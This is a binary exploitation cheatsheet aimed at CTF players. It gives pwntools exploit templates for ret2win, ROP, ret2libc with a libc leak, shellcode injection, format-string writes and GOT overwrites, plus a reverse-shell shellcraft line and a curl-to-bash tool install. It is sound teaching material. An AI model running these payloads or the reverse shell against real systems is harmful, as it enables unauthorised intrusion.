# PWN / Binary Exploitation Cheatsheet

> **Usage:** Replace `<BINARY>`, `<IP>`, `<PORT>` with your values. All commands assume Kali/Linux attacker machine with pwntools installed.

---

## Table of Contents
1. [Phase 1 — Recon & Protections](#phase-1--recon--protections)
2. [Phase 2 — Find Functions & Strings](#phase-2--find-functions--strings)
3. [Phase 3 — Disassemble Key Functions](#phase-3--disassemble-key-functions)
4. [Phase 4 — Identify the Vulnerability](#phase-4--identify-the-vulnerability)
5. [Phase 5 — Calculate the Offset](#phase-5--calculate-the-offset)
6. [Phase 6 — Verify with Crash Test](#phase-6--verify-with-crash-test)
7. [Phase 7 — Build the Exploit](#phase-7--build-the-exploit)
8. [Common Exploit Patterns](#common-exploit-patterns)
9. [Stack Alignment Fix](#stack-alignment-fix)
10. [ROP Chains](#rop-chains)
11. [Shellcode Injection](#shellcode-injection)
12. [Format String Attacks](#format-string-attacks)
13. [GOT Overwrite](#got-overwrite)
14. [ret2libc](#ret2libc)
15. [Pwntools Reference](#pwntools-reference)
16. [GDB Cheatsheet](#gdb-cheatsheet)
17. [MIPS-Specific Notes](#mips-specific-notes)
18. [Quick Decision Tree](#quick-decision-tree)

---

## Phase 1 — Recon & Protections

**Goal:** Determine architecture, endianness, and which protections are enabled. This dictates your entire exploit strategy.

```bash
# File type and architecture
file <BINARY>

# Security protections
checksec --file=<BINARY>

# Pwntools one-liner (most complete)
python3 -c "from pwn import *; ELF('<BINARY>')"
```

### Protection Cheat Table

| Protection | Enabled | Meaning | Exploit Impact |
|-----------|---------|---------|----------------|
| **PIE** | No PIE | Addresses are fixed | Can hardcode function addresses |
| **PIE** | PIE enabled | Base address randomized | Need info leak first, then calculate offsets |
| **NX** | NX enabled | Stack not executable | Can't run shellcode on stack — use ROP or existing functions |
| **NX** | NX disabled | Stack is executable | Can inject and execute shellcode directly |
| **Canary** | No canary | No stack corruption detection | Buffer overflow goes undetected |
| **Canary** | Canary found | Random value guards return address | Need to leak canary first, or find a write-what-where |
| **RELRO** | Partial | GOT is writable | Can overwrite GOT entries |
| **RELRO** | Full | GOT is read-only | Can't overwrite GOT — use other techniques |
| **Stripped** | No | Symbol names present | Can see function names in disassembly |
| **Stripped** | Yes | No symbol names | Must identify functions manually by behavior |

### Quick Decision After Recon

```
No PIE + No Canary + NX enabled  → ret2win / ROP (most common CTF setup)
No PIE + No Canary + NX disabled → shellcode injection
PIE enabled + No Canary          → need leak, then ret2win / ROP
Any + Canary                     → need canary leak or format string
```

---

## Phase 2 — Find Functions & Strings

**Goal:** Find win functions, dangerous functions, and interesting strings.

### List All Functions
```bash
# Named functions (if not stripped)
objdump -t <BINARY> | grep "\.text" | awk '{print $NF, $1}'

# With readelf
readelf -s <BINARY> | grep FUNC | awk '{print $8, $2}'

# Pwntools
python3 -c "
from pwn import *
elf = ELF('<BINARY>', checksec=False)
for name in sorted(elf.functions):
    print(f'  {name}: {hex(elf.functions[name].address)}')
"
```

### Extract Strings
```bash
# All strings
strings <BINARY>

# Targeted search for win indicators
strings <BINARY> | grep -iE "flag|shell|/bin|win|secret|exec|system|cat|sh$"

# With addresses
strings -t x <BINARY> | grep -iE "flag|shell|/bin|win"
```

### What to Look For

**Win function indicators:**
- Function names: `win`, `shell`, `flag`, `bell`, `success`, `backdoor`, `secret`, `getflag`
- String references: `/bin/sh`, `/bin/bash`, `flag.txt`, `cat flag`, `system`
- PLT entries: `system`, `execl`, `execve`, `execvp` — if present, something calls them

**Dangerous input functions (vulnerability sources):**
- `gets` — always overflows (no size limit)
- `scanf("%s", ...)` — no size limit
- `read(fd, buf, size)` — overflow if size > buffer
- `strcpy` — no bounds checking
- `sprintf` — no bounds checking
- `fgets(buf, size, stdin)` — safe IF size ≤ buffer (check both values)

---

## Phase 3 — Disassemble Key Functions

**Goal:** Understand what each function does, find the vulnerability, and identify the win target.

### Using objdump
```bash
# Full disassembly
objdump -d <BINARY> | less

# Specific function
objdump -d <BINARY> | grep -A 50 "<main>:"
objdump -d <BINARY> | grep -A 30 "<bell>:"
objdump -d <BINARY> | grep -A 30 "<win>:"

# Intel syntax (easier to read)
objdump -d -M intel <BINARY> | grep -A 50 "<main>:"
```

### Using Ghidra (Best for Complex Binaries)
```bash
# Install: apt install ghidra
ghidra    # Import binary → Auto-analyze → View decompiler
```
- Gives you **pseudo-C code** — much easier than reading assembly
- Shows variable types, buffer sizes, function calls
- Right-click → "References to" to trace data flow

### Using pwntools + capstone
```python
from pwn import *
from capstone import *

elf = ELF('<BINARY>', checksec=False)
data = open('<BINARY>', 'rb').read()
md = Cs(CS_ARCH_X86, CS_MODE_64)  # or CS_MODE_32 for 32-bit

func = elf.functions['main']
offset = func.address - elf.address  # file offset
func_bytes = data[offset:offset+func.size]

for insn in md.disasm(func_bytes, func.address):
    print(f"  {hex(insn.address)}: {insn.mnemonic}\t{insn.op_str}")
```

### Reading Disassembly — What to Look For

**In the win function — confirm it gives shell/flag:**
```asm
; Look for these patterns:
lea rdi, [rip + 0x...]    ; loads string address (first argument)
call system               ; system("/bin/sh")
call execl                ; execl("/bin/sh", ...)
call execve               ; execve("/bin/sh", ...)
```

**In main/vulnerable function — find the overflow:**
```asm
; Step A: Find buffer allocation
sub rsp, 0x20             ; allocates 32 bytes on stack

; Step B: Find buffer address passed to read/gets
lea rax, [rbp - 0x20]     ; buffer at rbp-0x20 (32 bytes from RBP)
mov rsi, rax              ; second arg to read() = buffer pointer

; Step C: Find read size
mov edx, 0x60             ; third arg to read() = 96 bytes
call read                 ; reads 96 into 32-byte buffer → OVERFLOW

; Step D: Or find gets() (always vulnerable)
lea rdi, [rbp - 0x40]     ; buffer address
call gets                 ; unlimited read → OVERFLOW
```

---

## Phase 4 — Identify the Vulnerability

### Buffer Overflow Detection

**From disassembly, extract these three values:**

| Value | Where to Find | Example |
|-------|--------------|---------|
| Buffer size | `sub rsp, 0xXX` or `lea reg, [rbp - 0xXX]` | `[rbp - 0x20]` → 32 bytes |
| Read size | `mov edx, 0xXX` before `call read` | `0x60` → 96 bytes |
| Input function | `call gets/read/scanf/fgets` | `call read` |

**Overflow exists when:** `read_size > buffer_size`
```
Example: read(0, buf, 96) into 32-byte buffer
Overflow = 96 - 32 = 64 bytes past the buffer
```

### Other Vulnerability Types
```
gets()              → always vulnerable, unlimited read
scanf("%s", buf)    → always vulnerable, no size limit  
strcpy(dst, src)    → overflow if src > dst
printf(user_input)  → format string vulnerability (no format specifier)
read(0, buf, n)     → overflow if n > buffer size
```

---

## Phase 5 — Calculate the Offset

**Goal:** Determine exactly how many bytes of padding are needed before the return address.

### x86-64 (64-bit) Stack Layout
```
Low addresses
┌──────────────────┐
│   local vars     │ ← rsp (stack pointer)
│   ...            │
│   buffer[0..N]   │ ← rbp - buffer_size
├──────────────────┤
│   saved RBP      │ ← rbp (8 bytes on 64-bit, 4 on 32-bit)
├──────────────────┤
│   return address  │ ← rbp + 8  *** THIS IS THE TARGET ***
├──────────────────┤
│   caller frame   │
└──────────────────┘
High addresses
```

### Formula
```
x86-64:  OFFSET = buffer_size + 8   (8 bytes for saved RBP)
x86-32:  OFFSET = buffer_size + 4   (4 bytes for saved RBP/EBP)
```

### Examples
```
Buffer at [rbp - 0x20] (32 bytes):   OFFSET = 32 + 8 = 40
Buffer at [rbp - 0x40] (64 bytes):   OFFSET = 64 + 8 = 72
Buffer at [rbp - 0x100] (256 bytes): OFFSET = 256 + 8 = 264
```

### Important: Verify Read Size Covers the Return Address
```
Need: read_size >= OFFSET + 8  (8 bytes for the target address)
Example: read_size=96, OFFSET=40 → 96 >= 48 ✓ (56 bytes of room after return addr)
```

---

## Phase 6 — Verify with Crash Test

**Goal:** Confirm the offset is correct before building the real exploit.

### Method 1: Cyclic Pattern (Recommended)
```python
from pwn import *

context.arch = 'amd64'
p = process('./<BINARY>')

# Generate a unique pattern
payload = cyclic(200)  # adjust size to read_size
p.sendlineafter(b'prompt> ', payload)  # adjust prompt

p.wait()
# Check crash in dmesg or core dump
```

### Method 2: GDB
```bash
gdb ./<BINARY>
run
# When prompted for input, send pattern:
# python3 -c "from pwn import *; print(cyclic(200).decode())"
# After crash:
info registers rip        # 64-bit
info registers eip        # 32-bit
```

Then find the offset:
```python
from pwn import *
# If RIP crashed at 0x6161616b:
print(cyclic_find(0x6161616b))  # prints the exact offset
```

### Method 3: Simple A's
```bash
# Send increasing lengths until crash
python3 -c "print('A'*40 + 'BBBBBBBB')" | ./<BINARY>
# If it crashes with RIP=0x4242424242424242, offset is 40
```

---

## Phase 7 — Build the Exploit

### Basic ret2win (No PIE, No Canary)
```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'  # or 'i386' for 32-bit

# Addresses from analysis
WIN = 0x40176d    # address of win/bell/flag function
OFFSET = 40       # calculated offset to return address

# Connect
# p = process('./<BINARY>')          # local
p = remote('<IP>', <PORT>)           # remote

# Receive until input prompt
p.recvuntil(b'> ')                   # adjust to actual prompt

# Build payload
payload = b'A' * OFFSET             # padding to reach return address
payload += p64(WIN)                  # overwrite return address with win function

# Send payload
p.sendline(payload)                  # or p.send(payload) if no newline needed

# Get flag / interactive shell
p.interactive()
```

### With Stack Alignment Fix (x86-64)
```python
# If exploit segfaults, add a ret gadget before win function
# Find ret gadget:
# ROPgadget --binary <BINARY> | grep ": ret$"

RET = 0x40101a    # ret gadget address

payload = b'A' * OFFSET
payload += p64(RET)       # align stack to 16 bytes
payload += p64(WIN)       # then jump to win
```

### For 32-bit Binaries
```python
context.arch = 'i386'

payload = b'A' * OFFSET   # padding (buffer + 4 for saved EBP)
payload += p32(WIN)        # overwrite return address

# If win function takes arguments:
payload += p32(0xdeadbeef) # return address after win (dummy)
payload += p32(0xcafebabe) # first argument to win
payload += p32(0xfeedface) # second argument to win
```

---

## Common Exploit Patterns

### Pattern 1: ret2win (Direct Jump)
**When:** Win function exists, no arguments needed, no PIE
```python
payload = b'A' * OFFSET + p64(WIN_ADDR)
```

### Pattern 2: ret2win with Arguments (64-bit)
**When:** Win function needs specific arguments
```python
# 64-bit calling convention: rdi, rsi, rdx, rcx, r8, r9
# Find gadgets: ROPgadget --binary <BINARY> | grep "pop rdi"

POP_RDI = 0x401234    # pop rdi; ret
POP_RSI_R15 = 0x401236  # pop rsi; pop r15; ret

payload = b'A' * OFFSET
payload += p64(POP_RDI)
payload += p64(0xdeadbeef)   # value for rdi (first arg)
payload += p64(WIN_ADDR)
```

### Pattern 3: ret2win with Arguments (32-bit)
**When:** Win function needs specific arguments on 32-bit
```python
# 32-bit: arguments on stack after return address
payload = b'A' * OFFSET
payload += p32(WIN_ADDR)
payload += p32(0x41414141)   # dummy return after win
payload += p32(0xdeadbeef)   # first arg
payload += p32(0xcafebabe)   # second arg
```

### Pattern 4: ret2system
**When:** `system` is in PLT, `/bin/sh` string exists in binary
```python
elf = ELF('<BINARY>')
SYSTEM = elf.plt['system']
BIN_SH = next(elf.search(b'/bin/sh'))
POP_RDI = 0x401234  # from ROPgadget
RET = 0x40101a

payload = b'A' * OFFSET
payload += p64(RET)          # stack alignment
payload += p64(POP_RDI)
payload += p64(BIN_SH)
payload += p64(SYSTEM)
```

### Pattern 5: ret2libc (ASLR Bypass)
**When:** PIE disabled but need libc functions, ASLR on libc
```python
# Step 1: Leak a libc address (e.g., via puts GOT)
elf = ELF('<BINARY>')
POP_RDI = 0x401234
RET = 0x40101a

# Leak puts GOT address
payload1 = b'A' * OFFSET
payload1 += p64(RET)
payload1 += p64(POP_RDI)
payload1 += p64(elf.got['puts'])
payload1 += p64(elf.plt['puts'])    # calls puts(GOT_puts) → leaks address
payload1 += p64(elf.symbols['main']) # return to main for second payload

p.sendline(payload1)
leaked = u64(p.recv(6).ljust(8, b'\x00'))
log.info(f'Leaked puts: {hex(leaked)}')

# Step 2: Calculate libc base
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc.address = leaked - libc.symbols['puts']

# Step 3: Call system("/bin/sh")
payload2 = b'A' * OFFSET
payload2 += p64(RET)
payload2 += p64(POP_RDI)
payload2 += p64(next(libc.search(b'/bin/sh')))
payload2 += p64(libc.symbols['system'])

p.sendline(payload2)
p.interactive()
```

---

## Stack Alignment Fix

**Problem:** On x86-64, `system()` and some libc functions require the stack to be 16-byte aligned when called. If your payload crashes with a SIGSEGV inside a `movaps` instruction, this is the issue.

**Fix:** Add an extra `ret` gadget before your target:

```bash
# Find a ret gadget
ROPgadget --binary <BINARY> | grep ": ret$"
# Or with pwntools:
python3 -c "from pwn import *; elf=ELF('<BINARY>'); rop=ROP(elf); print(hex(rop.find_gadget(['ret'])[0]))"
```

```python
RET = 0x40101a  # any "ret" gadget

# Before (crashes):
payload = b'A' * OFFSET + p64(WIN)

# After (works):
payload = b'A' * OFFSET + p64(RET) + p64(WIN)
```

**Rule:** If your exploit segfaults but the address is correct, try adding `p64(RET)` before the target.

---

## ROP Chains

### Finding Gadgets
```bash
# ROPgadget (most complete)
ROPgadget --binary <BINARY>
ROPgadget --binary <BINARY> | grep "pop rdi"
ROPgadget --binary <BINARY> | grep "pop rsi"
ROPgadget --binary <BINARY> | grep "pop rdx"
ROPgadget --binary <BINARY> | grep ": ret$"

# Ropper (alternative)
ropper --file <BINARY> --search "pop rdi"

# Pwntools automatic
from pwn import *
elf = ELF('<BINARY>')
rop = ROP(elf)
print(rop.dump())
```

### x86-64 Calling Convention
```
Argument 1: rdi
Argument 2: rsi
Argument 3: rdx
Argument 4: rcx
Argument 5: r8
Argument 6: r9
Return value: rax
```

### Building a ROP Chain with Pwntools
```python
from pwn import *

elf = ELF('<BINARY>')
rop = ROP(elf)

rop.call('puts', [elf.got['puts']])  # leak GOT
rop.call('main')                      # return to main

payload = b'A' * OFFSET + rop.chain()
```

---

## Shellcode Injection

**When:** NX is disabled (stack is executable), no canary.

```python
from pwn import *

context.arch = 'amd64'

# Generate shellcode
shellcode = asm(shellcraft.sh())  # execve("/bin/sh")

# If you know the buffer address (no ASLR/PIE):
BUF_ADDR = 0x7fffffffe000  # find via GDB

payload = shellcode                          # shellcode at start of buffer
payload += b'\x90' * (OFFSET - len(shellcode))  # NOP sled to fill rest
payload += p64(BUF_ADDR)                     # jump back to buffer

# If you need a NOP sled:
payload = b'\x90' * 100 + shellcode + b'\x90' * (OFFSET - 100 - len(shellcode)) + p64(BUF_ADDR)
```

### Common Shellcodes (pwntools)
```python
shellcraft.sh()              # execve("/bin/sh", 0, 0)
shellcraft.cat('/flag.txt')  # open + read + write flag
shellcraft.connect('IP', PORT) + shellcraft.dupsh()  # reverse shell
```

---

## Format String Attacks

**When:** Program does `printf(user_input)` instead of `printf("%s", user_input)`.

### Detection
```bash
# Send format specifiers as input
echo '%x.%x.%x.%x.%x.%x' | ./<BINARY>
# If it prints hex values → format string vulnerability

echo '%p.%p.%p.%p.%p.%p' | ./<BINARY>
# Prints stack pointers
```

### Leak Stack Values
```python
# Find which offset YOUR input starts at on the stack
for i in range(1, 30):
    p = process('./<BINARY>')
    p.sendline(f'AAAA%{i}$x'.encode())
    result = p.recvall()
    if b'41414141' in result:
        print(f'Input starts at offset {i}')
        break
    p.close()
```

### Arbitrary Write with %n
```python
from pwn import *

# Write value to address using format string
# %n writes number of bytes printed so far to the address pointed to by the argument

# Using pwntools fmtstr helper:
def send_payload(payload):
    p = process('./<BINARY>')
    p.sendline(payload)
    return p.recv()

# Automatically generates format string to write `what` at `where`
payload = fmtstr_payload(offset, {target_addr: value_to_write})
```

---

## GOT Overwrite

**When:** Partial RELRO (GOT is writable). Redirect a library function to your target.

```python
from pwn import *

elf = ELF('<BINARY>')

# Overwrite puts GOT entry with win function address
# Next time puts() is called, it actually calls win()

# Using format string:
payload = fmtstr_payload(offset, {elf.got['puts']: elf.symbols['win']})

# Using arbitrary write primitive:
# write win_addr to elf.got['exit'] so when exit() is called, win() runs
```

---

## ret2libc

### Step 1: Identify Libc Version
```bash
# If you can leak two function addresses, use libc database:
# https://libc.blukat.me/
# https://libc.rip/

# Leak puts and printf addresses, search for matching libc
```

### Step 2: Find Offsets in Libc
```bash
# Local libc
strings -t x /lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh"
readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep -E " system| puts"
```

### Step 3: One-Gadget (Fastest ret2libc)
```bash
# Find magic gadgets that spawn shell with minimal setup
one_gadget /lib/x86_64-linux-gnu/libc.so.6

# Returns addresses like:
# 0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
# constraints: rsp & 0xf == 0, rcx == NULL

# Use in exploit:
payload = b'A' * OFFSET + p64(libc.address + ONE_GADGET)
```

---

## Pwntools Reference

### Connection
```python
p = process('./<BINARY>')                     # local
p = remote('<IP>', <PORT>)                    # remote
p = process(['qemu-mips', '-L', '/usr/mips-linux-gnu', './<BINARY>'])  # MIPS via qemu
```

### I/O
```python
p.recv()                    # receive available data
p.recv(n)                   # receive exactly n bytes
p.recvline()                # receive until newline
p.recvuntil(b'> ')          # receive until delimiter
p.recvall(timeout=5)        # receive everything

p.send(b'data')             # send raw bytes
p.sendline(b'data')         # send with newline
p.sendafter(b'> ', payload) # wait for prompt, then send
p.sendlineafter(b'> ', payload)

p.interactive()             # hand off to user (for shell)
```

### Packing
```python
p64(0x401234)     # pack 64-bit address (little-endian)
p32(0x401234)     # pack 32-bit address
u64(b'\x34\x12\x40\x00\x00\x00\x00\x00')  # unpack 64-bit
u32(b'\x34\x12\x40\x00')                    # unpack 32-bit

# For big-endian (MIPS, etc):
p32(0x401234, endian='big')
```

### ELF Analysis
```python
elf = ELF('<BINARY>')
elf.symbols['main']         # function address
elf.plt['system']           # PLT stub address
elf.got['puts']             # GOT entry address
elf.functions['main'].size  # function size
next(elf.search(b'/bin/sh'))  # find string in binary
```

### Pattern Generation
```python
cyclic(200)                 # generate 200-byte unique pattern
cyclic_find(0x61616168)     # find offset of value in pattern
```

### ROP
```python
rop = ROP(elf)
rop.call('puts', [elf.got['puts']])
rop.call('main')
print(rop.dump())           # show ROP chain
rop.chain()                 # get raw bytes

# Find gadgets
rop.find_gadget(['pop rdi', 'ret'])
rop.find_gadget(['ret'])
```

### Shellcode
```python
context.arch = 'amd64'
shellcode = asm(shellcraft.sh())
shellcode = asm(shellcraft.cat('/flag.txt'))
```

### Logging
```python
context.log_level = 'debug'   # show all I/O
context.log_level = 'info'    # normal
context.log_level = 'warn'    # quiet
```

---

## GDB Cheatsheet

### Setup
```bash
# Install pwndbg (best GDB plugin for pwn)
git clone https://github.com/pwndbg/pwndbg
cd pwndbg && ./setup.sh

# Or GEF
bash -c "$(curl -fsSL https://gef.blah.cat/sh)"
```

### Running
```bash
gdb ./<BINARY>
run                          # run program
run < <(python3 -c "...")    # run with piped input

# Attach to running process
gdb -p <PID>

# For QEMU (MIPS/ARM)
# Terminal 1: qemu-mips -L /usr/mips-linux-gnu -g 1234 ./<BINARY>
# Terminal 2: gdb-multiarch <BINARY> -ex "target remote :1234"
```

### Breakpoints
```bash
b main                       # break at function
b *0x401234                  # break at address
b *main+50                   # break at offset from function
info breakpoints             # list breakpoints
delete 1                     # delete breakpoint 1
```

### Examination
```bash
info registers               # all registers
info registers rip rsp rbp   # specific registers

x/20wx $rsp                  # examine 20 words at stack pointer
x/10gx $rsp                  # examine 10 giant (8-byte) words
x/s 0x402000                 # examine as string
x/i 0x401234                 # examine as instruction
x/50i main                   # disassemble 50 instructions from main

stack 20                     # pwndbg: show 20 stack entries
telescope $rsp 20            # pwndbg: show stack with dereferencing
```

### Stepping
```bash
ni                           # next instruction (skip calls)
si                           # step into (follow calls)
c                            # continue execution
finish                       # run until current function returns
```

### Finding the Crash
```bash
# After crash:
info registers rip           # where did it crash?
bt                           # backtrace

# Pattern offset:
python3 -c "from pwn import *; print(cyclic_find(0x6161616b))"
```

---

## MIPS-Specific Notes

### Architecture Differences
```
- Big-endian (usually) — use p32(addr, endian='big')
- 32-bit addresses
- Return address in $ra register (not on stack like x86)
- $ra saved with: sw $ra, offset($sp)
- Branch delay slots — instruction AFTER branch always executes
- Function args: $a0, $a1, $a2, $a3 (then stack)
- No NX equivalent in most MIPS setups
```

### MIPS Offset Calculation
```
Frame size:    addiu $sp, $sp, -0xXX     (subtract from SP)
$ra saved at:  sw $ra, 0xYY($sp)        (save return address)
Buffer at:     sw $a0, 0xZZ($fp)        (or addiu + offset)

Offset = $ra_position - buffer_position
```

### Running MIPS Binaries
```bash
# Install
apt install qemu-user gcc-mips-linux-gnu

# Run
qemu-mips -L /usr/mips-linux-gnu ./<BINARY>

# Debug with GDB
qemu-mips -L /usr/mips-linux-gnu -g 1234 ./<BINARY>
gdb-multiarch <BINARY> -ex "target remote :1234"
```

### MIPS Pwntools
```python
context.arch = 'mips'
context.endian = 'big'
context.bits = 32

p = process(['qemu-mips', '-L', '/usr/mips-linux-gnu', './<BINARY>'])
payload = b'A' * OFFSET + p32(WIN_ADDR)  # auto big-endian from context
```

---

## Quick Decision Tree

```
1. Run checksec
   │
   ├─ No PIE + No Canary
   │   ├─ Win function exists → ret2win (jump directly)
   │   ├─ system() in PLT + /bin/sh string → ret2system
   │   ├─ No useful functions → ret2libc (leak + system)
   │   └─ NX disabled → shellcode injection
   │
   ├─ PIE enabled + No Canary
   │   └─ Need info leak first → then ret2win/ret2libc with calculated addresses
   │
   ├─ No PIE + Canary
   │   ├─ Format string vuln → leak canary, then overflow
   │   └─ Multiple reads → leak canary in first read, overflow in second
   │
   └─ PIE + Canary
       └─ Need two leaks (canary + base address) → then overflow

2. Find the vulnerability
   ├─ gets() / read(fd, buf, LARGE) / scanf("%s") → buffer overflow
   ├─ printf(user_input) → format string
   └─ Use-after-free / double-free → heap exploitation

3. Find the target
   ├─ win/flag/shell function → jump to it
   ├─ system@PLT → call system("/bin/sh")
   └─ Nothing useful → leak libc → ret2libc
```

---

## Tool Installation
```bash
# Pwntools
pip install pwntools

# ROPgadget
pip install ROPgadget

# one_gadget
gem install one_gadget

# Ghidra
apt install ghidra

# pwndbg (GDB plugin)
git clone https://github.com/pwndbg/pwndbg && cd pwndbg && ./setup.sh

# QEMU for cross-arch
apt install qemu-user qemu-user-static

# Cross-compilation
apt install gcc-mips-linux-gnu gcc-aarch64-linux-gnu gcc-arm-linux-gnueabihf
```
